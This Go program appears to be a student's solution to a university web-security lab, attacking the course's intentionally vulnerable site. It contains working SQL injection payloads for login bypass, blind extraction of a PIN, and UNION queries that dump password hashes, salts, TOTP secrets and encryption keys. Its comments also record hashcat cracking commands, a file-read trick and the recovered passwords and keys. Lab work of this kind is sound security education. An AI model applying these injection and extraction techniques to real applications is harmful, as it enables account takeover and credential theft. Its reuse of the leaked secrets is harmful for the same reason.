package main

import (
    "crypto/tls"
    "fmt"
    "io/ioutil"
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "strconv"
    "strings"

    "github.com/xlzd/gotp"
)

var jar *cookiejar.Jar
var target *url.URL
func init() {
    var err error
    jar, err = cookiejar.New(nil)
    if err != nil {
        panic(err)
    }
    target, err = url.Parse("https://kbe.felk.cvut.cz/index.php")
    if err != nil {
        panic(err)
    }
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    http.DefaultClient.Jar = jar
}

func send(values url.Values) string {
    resp, err := http.PostForm("https://kbe.felk.cvut.cz/index.php", values)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()
    data, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        panic(err)
    }
    return string(data)
}

func get(path string)  string {
    resp, err := http.Get(fmt.Sprintf("https://kbe.felk.cvut.cz/%s", path))
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()
    data, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        panic(err)
    }
    return string(data)
}

func logout() {
    get("index.php?logout")
}

func main() {
    // basic SQL injection
    //fmt.Println(send(url.Values{
    //    "username": {`dzivjmat' AND 1 = 1 #`},
    //    "password": {"placeholder"},
    //}))
    //logout()

    // break pin
    //pin := stealPin()
    //fmt.Printf("PIN: %s\n", pin)
    // result: 4425

    // break OTP
    //fmt.Println(send(url.Values{
    //    "username": {`unexistent_user' UNION ALL SELECT secret AS username FROM users WHERE username = 'dzivjmat' #`},
    //    "password": {"placeholder"},
    //}))
    // result: 3XLU4LMYWYYNFFW4
    totp := gotp.NewDefaultTOTP("3XLU4LMYWYYNFFW4")
    fmt.Println(totp.Now())

    //fmt.Println(get(fmt.Sprintf("https://kbe.felk.cvut.cz/index.php?%s", url.QueryEscape("offset=1 UNION SELECT CONCAT(username, ';', password, ';', salt, ';', pin), 1 FROM users"))))

    // crack password:
    // echo "62814f10dd416b616f733605740304cd87ba7508:ac598" > hash.txt
    // hashcat -a 3 -m110 hast.txt --force
    // result: 12f40

    // get teachers password:
    // obtained from: https://hashtoolkit.com/decrypt-hash/?hash=2d55131b6752f066ee2cc57ba8bf781b4376be85
    // result: fm9fytmf7q
    // it's "long" but contains only numbers and lowercase letters

    //fmt.Println(get(fmt.Sprintf("https://kbe.felk.cvut.cz/index.php?%s", url.QueryEscape("offset=1 UNION ALL SELECT CONCAT(TABLE_NAME, ';', TABLE_ROWS), 1 FROM INFORMATION_SCHEMA.TABLES"))))
    //codes;20
    //messages;57
    //users;19

    //fmt.Println(get(fmt.Sprintf("https://kbe.felk.cvut.cz/index.php?%s", url.QueryEscape("offset=1 UNION ALL SELECT column_name, 1 INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'messages'"))))
    //username
    //base64_message_xor_key
    //date_time

    //fmt.Println(get(fmt.Sprintf("https://kbe.felk.cvut.cz/index.php?%s", url.QueryEscape("offset=1 UNION ALL SELECT column_name, 1 INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'codes'"))))
    //username
    //aes_encrypt_code

    //fmt.Println(get(fmt.Sprintf("https://kbe.felk.cvut.cz/index.php?%s", url.QueryEscape("offset=1 UNION ALL SELECT column_name, 1 INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users'"))))
    //username
    //password
    //pin
    //secret
    //salt

    //fmt.Println(get(fmt.Sprintf("https://kbe.felk.cvut.cz/index.php?%s", url.QueryEscape("offset=1 UNION ALL SELECT base64_message_xor_key, 1 FROM messages WHERE username = 'dzivjmat'"))))
    //LwoePAQIHH9ZUAkCJQIUDzJTRA4fGlFefx8NECxFW0RGJgQXF39UWUBDDE8BOggXHCtFX1IVLAoFAHE=
    //RA5SNxkAH2JCW1kCOhNMFTdCD1FfHApVYSMACzpZHVZYfxINEH9RUVwQHgYcO0scFioXEkQDPB4QAH9RX1ZVVg==
    //LwoeM0dFDTcERhAVfwoOCX9UX0AQFgAFcUs2DT4cEkMTMQ4GRTldQhJEEApSMQ4dDX8GWlYKMw4MAjpBHg==

    //Welcome <b>dzivjmat</b>, this is your first secret message.
    //<a href="index.php?code">Here</a> you can find your secure code.
    //Well, that's all for now. Stay tuned for the next challenges.

    // use code from crypto lab 1:
    // encoded := LwoePAQIHH9ZUAkCJQIUDzJTRA4fGlFefx8NECxFW0RGJgQXF39UWUBDDE8BOggXHCtFX1IVLAoFAHE=
    //	data, _ := ioutil.ReadAll(base64.NewDecoder(base64.StdEncoding, strings.NewReader(encoded)))
    //	fmt.Println(XORWithKey(string(data), "Welcome <b>dzivjmat</b>, this is your first secret message."))
    // result: xor_key_e27f_kbe_2020

    // https://kbe.felk.cvut.cz/index.php?open=index.php
    //define("AES_ENCRYPT_CODE_KEY", "UScnF4L5AX5kmpib");
    // result: UScnF4L5AX5kmpib

    //fmt.Println(get(fmt.Sprintf("https://kbe.felk.cvut.cz/index.php?%s", url.QueryEscape("offset=1 UNION ALL SELECT CONCAT(username, ":", aes_encrypt_code), 1 FROM codes"))))
    // rehakmar:7280ED648FEDDB0E8BC8B12DA93723BF824AE15DC1DB8204238F3583FE5DB0CF
    //     d, _ := hex.DecodeString("7280ED648FEDDB0E8BC8B12DA93723BF824AE15DC1DB8204238F3583FE5DB0CF")
    //    fmt.Println(len(d))
    //    fmt.Println(string(DecryptAESECB([]byte("UScnF4L5AX5kmpib"), d)))
    // result: acid-load-direct-obvious
}

func stealPin() string {
    pin := ""
    for len(pin) != 4 {
        for i := 0; i < 10; i++ {
            fmt.Printf("cur: %s, try: %d\n", pin, i)
            res := send(url.Values{
                "username": {fmt.Sprintf(`dzivjmat' AND pin LIKE '%s%d%%' #`, pin, i)},
                "password": {"placeholder"},
            })
            if strings.Contains(res, "PIN") {
                pin += strconv.Itoa(i)
                logout()
                break
            }
        }
    }
    return pin
}
